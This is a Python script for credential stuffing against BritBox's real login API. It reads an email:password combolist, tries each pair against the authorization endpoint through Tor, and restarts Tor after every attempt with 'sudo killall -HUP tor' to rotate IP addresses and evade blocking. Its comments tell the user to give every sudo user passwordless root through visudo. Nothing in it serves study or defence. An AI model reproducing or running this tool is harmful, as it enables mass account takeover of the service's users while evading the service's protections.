import requests
import time
import subprocess, shlex
from header import drawHeader as Look_Ma_No_Hands

# sudo visudo
# Edit at the bottom:
# %sudo ALL=(ALL:ALL) NOPASSWD: ALL

endpoint = 'https://www.britbox.co.uk/api/authorization?ff=idp%2Cldp%2Crpt&lang=en'
users=[];passwords=[]; accountList=[];No=0
a=0;counter=0

def ringAroundtheRosy():
	
	newip = shlex.split('sudo killall -HUP tor')
	subprocess.run((newip), stdout = subprocess.DEVNULL, shell = False)

while True:
	
	Look_Ma_No_Hands()
	combolist = input('Combolist (i.e. /home/user/combos): ')

	try:

		with open (combolist,'r') as accounts:

				for lines in accounts:
					users.append(lines.split(":")[0])
					passwords.append(lines.split("|")[0].split(":")[1])
		break

	except:

		input("\nSomething valid, Cockhead. Try again...\n (hit Enter)")
			
accounts.close()

while a<len(users):
	if counter%5== 0 and counter !=0:
		Look_Ma_No_Hands()
	try:

		with requests.session() as login:

			tor = {'http':'socks5h://localhost:9050', 'https':'socks5h://localhost:9050'}
			myip = login.get('http://httpbin.org/ip',proxies=tor)
			ipaddress = myip.text.split('"')[3].strip(" ")
			postResponse = login.post(endpoint, json={'email': users[No], 'password': passwords[No], 'scopes':['Catalog']}, proxies = tor)
		
			print ("Trying Combo: "+users[No]+":"+passwords[No]+" ---> IP: "+ipaddress)		
			ringAroundtheRosy()
			
			if 'could not be satisfied' in postResponse.text:
				a=a; No=No; counter +=1
				
			elif 'failed' in postResponse.text:
				accountList.append(users[No]+":"+passwords[No]+"---> Bad")
				print(postResponse.text)
				a +=1; No +=1
			else:
				print (postResponse.text)
				a +=1; No +=1
			
	except:
		print("Host unreachable")

login.close()

ctr=0
with open ('end_result','w') as results:
	while ctr < len(accountList):
		results.write(accountList[ctr]+"\n")
		ctr +=1
results.close()
	
